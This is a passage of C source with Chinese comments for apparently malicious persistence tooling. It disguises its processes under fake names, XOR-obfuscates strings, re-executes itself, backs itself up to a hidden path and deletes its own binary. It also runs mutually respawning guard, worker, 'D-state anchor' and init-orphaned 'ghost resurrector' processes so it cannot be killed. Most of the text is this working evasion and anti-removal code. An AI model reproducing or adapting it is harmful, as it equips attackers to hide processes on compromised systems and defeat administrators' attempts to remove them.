void guard_main(int my_idx, char **argv)
{
    ChangeProcessName(argv, fake_names[my_idx % NUM_FAKE_NAMES]);
    signal(SIGCHLD, SIG_IGN);

    while (1)
    {
        usleep(20000 + (my_idx * 5000));

        int i;
        pid_t wp = shared->pids[NUM_GUARDS];
        if (wp <= 0 || kill(wp, 0) != 0)
        {
            pid_t w = spawn_worker(argv);
            shared->pids[NUM_GUARDS] = w;
        }

        for (i = 0; i < NUM_GUARDS; i++)
        {
            if (i == my_idx)
                continue;
            pid_t gp = shared->pids[i];
            if (gp <= 0 || kill(gp, 0) != 0)
            {
                pid_t np = spawn_guard(i, argv);
                shared->pids[i] = np;
            }
        }

        /* 监控 D 状态锚点进程，若被杀（内层进程退出导致外层也退出）则重建 */
        for (i = 0; i < NUM_ANCHORS; i++)
        {
            pid_t ap = shared->anchors[i];
            if (ap <= 0 || kill(ap, 0) != 0)
            {
                shared->anchors[i] = spawn_anchor(argv);
            }
        }
    }
}

/*
 * 自举重启：第一次运行时，通过 /proc/self/exe 用一个很长的 argv[0] 重新 execve 自身。
 * 这样内核为新进程分配的 cmdline 区域就足够大，后续 ChangeProcessName 可以写入完整名字。
 * 用 REEXEC_MAGIC 环境变量标记已经重启过，避免无限循环。
 */
void reexec_with_padding(int argc, char *argv[])
{
    /* 构造长 argv[0]：用空格填充到 CMDLINE_PAD 字节 */
    char padded[CMDLINE_PAD];
    memset(padded, ' ', CMDLINE_PAD);
    padded[CMDLINE_PAD - 1] = '\0';

    /* 构造新 argv：padded + 原始参数 + REEXEC_MAGIC 标记 */
    int new_argc = argc + 1;
    char **new_argv = (char **)malloc((new_argc + 1) * sizeof(char *));
    new_argv[0] = padded;
    int i;
    for (i = 1; i < argc; i++)
        new_argv[i] = argv[i];
    new_argv[argc] = (char *)XorString(REEXEC_MAGIC);
    new_argv[argc + 1] = NULL;

    /* 通过 /proc/self/exe 重新执行自身 */
    execve(XorString("/proc/self/exe"), new_argv, environ);
}

int main(int argc, char *argv[])
{
    /* 检查是否是重启后的执行 */
    int is_reexec = 0;
    int is_ghost  = 0; /* 由复活器重启，跳过备份（备份已存在） */
    if (argc >= 2 && strcmp(argv[argc - 1], XorString(REEXEC_MAGIC)) == 0)
    {
        is_reexec = 1;
        argc--;
        argv[argc] = NULL;
    }
    else if (argc >= 2 && strcmp(argv[argc - 1], XorString(GHOST_MAGIC)) == 0)
    {
        is_reexec = 1; /* 跳过 reexec_with_padding */
        is_ghost  = 1; /* 跳过备份 */
        argc--;
        argv[argc] = NULL;
    }

    if (!is_reexec)
    {
        /* 首次运行：先重启自身以获得足够长的 argv 缓冲区 */
        reexec_with_padding(argc, argv);
        /* 如果 execve 失败，fallthrough 继续正常执行 */
    }

    /* 初始化 cmdline 覆盖区域 */
    init_proc_title(argc, argv);


    /* 备份自身到隐藏路径（在 unlink 之前），供复活器使用
     * ghost 重启时备份已存在，跳过避免写冲突 */
    if (!is_ghost)
        backup_self();

    /* 通过 /proc/self/exe 获取真实路径来 unlink */
    char exe_path[256] = {0};
    int n = readlink(XorString("/proc/self/exe"), exe_path, sizeof(exe_path) - 1);
    if (n > 0)
    {
        exe_path[n] = '\0';
        unlink(exe_path);
    }

    init_deamon();
    signal(SIGCHLD, SIG_IGN);   /* 尽早设置，防止后续 fork 产生僵尸 */

    srand(getpid() ^ time(NULL));

    shared = (shared_pids_t *)mmap(NULL, sizeof(shared_pids_t),
        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    memset(shared, 0, sizeof(shared_pids_t));

    shared->pids[NUM_GUARDS] = spawn_worker(argv);

    int i;
    for (i = 0; i < NUM_GUARDS; i++)
    {
        shared->pids[i] = spawn_guard(i, argv);
    }

    /* 初始化 D 状态锚点进程 */
    for (i = 0; i < NUM_ANCHORS; i++)
    {
        shared->anchors[i] = spawn_anchor(argv);
    }

    /* 启动幽灵复活器（托孤给 init，独立于守护进程组）
     * 传入所有守护进程+工作进程的 PID，任一存活则不重启 */
    {
        pid_t all_pids[TOTAL_PROCS];
        for (i = 0; i < NUM_GUARDS; i++)
            all_pids[i] = shared->pids[i];
        all_pids[NUM_GUARDS] = shared->pids[NUM_GUARDS];
        spawn_ghost(argv, all_pids, TOTAL_PROCS);
    }

    ChangeProcessName(argv, fake_names[(NUM_GUARDS + 1) % NUM_FAKE_NAMES]);
    while (1)
    {
        usleep(15000);
        pid_t wp = shared->pids[NUM_GUARDS];
        if (wp <= 0 || kill(wp, 0) != 0)
        {
            pid_t w = spawn_worker(argv);
            shared->pids[NUM_GUARDS] = w;
        }
        for (i = 0; i < NUM_GUARDS; i++)
        {
            pid_t gp = shared->pids[i];
            if (gp <= 0 || kill(gp, 0) != 0)
            {
                pid_t np = spawn_guard(i, argv);
                shared->pids[i] = np;
            }
        }
        /* 主进程也监控锚点 */
        for (i = 0; i < NUM_ANCHORS; i++)
        {
            pid_t ap = shared->anchors[i];
            if (ap <= 0 || kill(ap, 0) != 0)
            {
                shared->anchors[i] = spawn_anchor(argv);
            }
        }
    }
    return 0;
}
